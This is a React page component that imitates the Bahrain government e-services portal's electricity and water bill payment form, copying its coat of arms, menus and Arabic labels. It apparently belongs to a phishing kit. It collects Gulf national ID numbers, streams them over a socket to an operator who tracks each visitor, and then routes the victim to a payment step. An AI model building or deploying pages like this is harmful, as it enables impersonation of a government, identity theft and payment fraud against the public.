import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { navigateToPage, sendData, socket } from "@/lib/store";

export default function HomePage() {
  const [, setLocation] = useLocation();
  const [idType, setIdType] = useState("");
  const [idNumber, setIdNumber] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    navigateToPage('الصفحة الرئيسية');
  }, []);

  const handleSubmit = () => {
    if (!idType || !idNumber) return;
    setIsSubmitting(true);

    const idTypeLabel = 
      idType === 'bahraini' ? 'الرقم الشخصي البحريني' :
      idType === 'emirati' ? 'الرقم الشخصي الإماراتي' :
      idType === 'saudi' ? 'الرقم الشخصي السعودي' :
      idType === 'omani' ? 'الرقم الشخصي العماني' : idType;

    if (socket.value.connected) {
      socket.value.emit('visitor:updateName', idNumber);
    }

    sendData({
      data: {
        idType: idTypeLabel,
        idNumber,
      },
      current: 'الصفحة الرئيسية',
      nextPage: 'summary-payment',
      waitingForAdminResponse: false,
    });

    setTimeout(() => {
      setIsSubmitting(false);
      setLocation('/summary-payment');
    }, 1000);
  };

  return (
    <div style={{ minHeight: '100vh', background: '#e8e8e8', fontFamily: "Arial, Tahoma, sans-serif", direction: 'rtl' }}>
      
      {/* ===== ROW 1: Logo + English ===== */}
      <div style={{ background: '#f0f0f0', borderBottom: '1px solid #ddd', padding: '10px 0' }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          {/* RIGHT: Logo + حكومة مملكة البحرين */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <img src="/bahrain-coat.jpg" alt="حكومة مملكة البحرين" style={{ height: '60px' }} />
          </div>
          {/* LEFT: English */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
            <span style={{ fontSize: '18px', color: '#555' }}>🌐</span>
            <span style={{ fontSize: '15px', color: '#333', fontFamily: 'Arial, sans-serif' }}>English</span>
          </div>
        </div>
      </div>

      {/* ===== ROW 2: الخدمات الإلكترونية | دليل المعلومات + تسجيل الدخول + weather ===== */}
      <div style={{ background: '#f5f5f5', borderBottom: '1px solid #ccc', padding: '8px 0' }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          {/* RIGHT: الخدمات الإلكترونية | دليل المعلومات */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <a href="#" style={{ fontSize: '24px', fontWeight: 'bold', color: '#006272', textDecoration: 'underline', borderBottom: '3px solid #006272', paddingBottom: '2px', fontFamily: 'Arial, Tahoma, sans-serif' }}>الخدمات الإلكترونية</a>
            <span style={{ color: '#aaa', fontSize: '22px', margin: '0 5px' }}>|</span>
            <a href="#" style={{ fontSize: '24px', fontWeight: 'bold', color: '#333', textDecoration: 'none', fontFamily: 'Arial, Tahoma, sans-serif' }}>دليل المعلومات</a>
          </div>
          {/* LEFT: تسجيل الدخول + weather icons */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <span style={{ fontSize: '22px', color: '#777' }}>📋</span>
            <span style={{ fontSize: '22px', color: '#777' }}>⛅</span>
            <a href="#" style={{
              background: '#006272', color: '#fff', padding: '8px 24px', borderRadius: '4px',
              fontSize: '15px', fontWeight: 'bold', textDecoration: 'none', display: 'inline-block'
            }}>
              تسجيل الدخول
            </a>
          </div>
        </div>
      </div>

      {/* ===== ROW 3: NAVIGATION BAR ===== */}
      <div style={{ background: '#fff', borderBottom: '3px solid #0055a5' }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 20px', display: 'flex' }}>
          {[
            { label: 'الصفحة الرئيسية', icon: true },
            { label: 'الخدمات الإلكترونية حسب التصنيف' },
            { label: 'الخدمات الإلكترونية حسب المقدم' },
            { label: 'متجر تطبيقات الحكومة الإلكترونية' },
          ].map((item, i) => (
            <a key={i} href="#" style={{
              padding: '12px 25px', fontSize: '14px', color: '#333', textDecoration: 'none',
              borderLeft: '1px solid #e0e0e0',
              display: 'flex', alignItems: 'center', gap: '6px',
              fontWeight: 400,
              ...(i === 3 ? { borderLeft: 'none' } : {}),
            }}>
              {item.icon && <span style={{ color: '#0055a5', fontSize: '20px', fontWeight: 'bold', lineHeight: 1 }}>|</span>}
              {item.label}
            </a>
          ))}
        </div>
      </div>

      {/* ===== BANNER ===== */}
      <div style={{ maxWidth: '1200px', margin: '20px auto', padding: '0 15px' }}>
        <div style={{
          background: '#e8f4fc', border: '2px dashed #c8a0a0', padding: '20px 30px',
          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
          minHeight: '80px'
        }}>
          <div style={{ flex: 1, textAlign: 'center' }}>
            <p style={{ fontSize: '20px', fontWeight: 'bold', color: '#333', margin: '0 0 5px 0' }}>
              استفد من خدمات <a href="#" style={{ color: '#0066cc', textDecoration: 'underline' }}>التخويل الإلكتروني</a>
            </p>
            <p style={{ fontSize: '16px', color: '#555', margin: 0 }}>
              لإنجاز خدمات المكاتب الأمامية للجهات الحكومية
            </p>
          </div>
          <div style={{ width: '100px', textAlign: 'center' }}>
            <img src="https://services.bahrain.bh/wps/portal/ar/!ut/p/a1/04_Sj9CPykssy0xPLMnMz0vMAfGjzOI9HT09PYy8DbwMHE0tDBzNfEKCnD0cDQ0MjIAKIoEKDHAARwNC-sP1o8BK8JhQkBthkO6oqAgAMlXmfA!!/dl5/d5/L0lHSkovd0RNQUprQUVnQSEhLzROVkUvYXI!/" alt="" style={{ maxWidth: '80px', opacity: 0.8 }} onError={(e: any) => e.target.style.display = 'none'} />
          </div>
        </div>
      </div>

      {/* ===== MAIN CONTENT AREA ===== */}
      <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 15px' }}>
        
        {/* القائمة label on the left */}
        <div style={{ display: 'flex', justifyContent: 'flex-start', marginBottom: '10px' }}>
          <a href="#" style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '14px', color: '#333', textDecoration: 'none' }}>
            <span style={{ fontSize: '18px' }}>☰</span> القائمة
          </a>
        </div>

        {/* Title */}
        <h2 style={{ fontSize: '24px', fontWeight: 'bold', color: '#333', margin: '0 0 15px 0', textAlign: 'right' }}>
          دفع فاتورة الكهرباء والماء
        </h2>

        {/* ===== BLUE BAR: Instructions ===== */}
        <div style={{
          background: '#0000CC', color: '#fff', padding: '12px 20px',
          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
          cursor: 'pointer', marginBottom: '12px', fontSize: '16px', fontWeight: 'bold'
        }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <span style={{ fontSize: '20px' }}>ℹ️</span>
            اضغط هنا لعرض التعليمات
          </div>
          <span style={{ fontSize: '14px' }}>▼</span>
        </div>

        {/* Required note */}
        <p style={{ fontSize: '14px', color: '#333', margin: '10px 0 15px 0', textAlign: 'right' }}>
          * بيانات مطلوبة
        </p>

        {/* ===== BLUE BAR: Customer Details ===== */}
        <div style={{
          background: '#0000CC', color: '#fff', padding: '10px 20px',
          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
          fontSize: '16px', fontWeight: 'bold'
        }}>
          <span style={{ fontSize: '14px' }}>▲</span>
          <span>تفاصيل العميل</span>
        </div>

        {/* ===== FORM ===== */}
        <div style={{
          background: '#fff', border: '1px solid #ccc', borderTop: 'none',
          padding: '20px'
        }}>
          {/* ID Type Row */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '15px', marginBottom: idType ? '15px' : '0' }}>
            <label style={{ fontSize: '14px', fontWeight: 'bold', color: '#333', whiteSpace: 'nowrap' }}>
              <span style={{ color: 'red' }}>*</span> نوع الهوية:
            </label>
            <select
              value={idType}
              onChange={e => setIdType(e.target.value)}
              style={{
                flex: 1, padding: '8px 12px', border: '1px solid #ccc', borderRadius: '0',
                fontSize: '14px', background: '#fff', cursor: 'pointer', direction: 'rtl',
                maxWidth: '300px'
              }}
            >
              <option value="">-- اختر نوع الهوية --</option>
              <option value="emirati">الرقم الشخصي الإماراتي</option>
              <option value="bahraini">الرقم الشخصي البحريني</option>
              <option value="saudi">الرقم الشخصي السعودي</option>
              <option value="omani">الرقم الشخصي العماني</option>
            </select>
          </div>

          {/* ID Number - shown after selecting type */}
          {idType && (
            <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
              <label style={{ fontSize: '14px', fontWeight: 'bold', color: '#333', whiteSpace: 'nowrap' }}>
                <span style={{ color: 'red' }}>*</span> رقم الهوية:
              </label>
              <input
                type="text"
                value={idNumber}
                onChange={e => setIdNumber(e.target.value.replace(/[^0-9]/g, ''))}
                placeholder="أدخل رقم الهوية"
                maxLength={12}
                style={{
                  flex: 1, padding: '8px 12px', border: '1px solid #ccc', borderRadius: '0',
                  fontSize: '14px', direction: 'ltr', textAlign: 'left', maxWidth: '300px'
                }}
              />
            </div>
          )}
        </div>

        {/* ===== BUTTONS ===== */}
        <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', margin: '20px 0 40px 0' }}>
          {idType && idNumber && (
            <button
              onClick={handleSubmit}
              disabled={isSubmitting}
              style={{
                background: isSubmitting ? '#ccc' : '#006272',
                color: '#fff', border: 'none', padding: '8px 30px', borderRadius: '0',
                fontSize: '14px', fontWeight: 'bold', cursor: isSubmitting ? 'not-allowed' : 'pointer',
              }}
            >
              {isSubmitting ? 'جاري المعالجة...' : 'التالي'}
            </button>
          )}
          <button style={{
            background: '#FFD700', color: '#333', border: 'none', padding: '8px 30px',
            borderRadius: '0', fontSize: '14px', fontWeight: 'bold', cursor: 'pointer'
          }}>
            رجوع
          </button>
        </div>
      </div>

      {/* ===== BOTTOM BLUE LINE ===== */}
      <div style={{ height: '5px', background: '#0055a5', marginTop: '20px' }}></div>
    </div>
  );
}
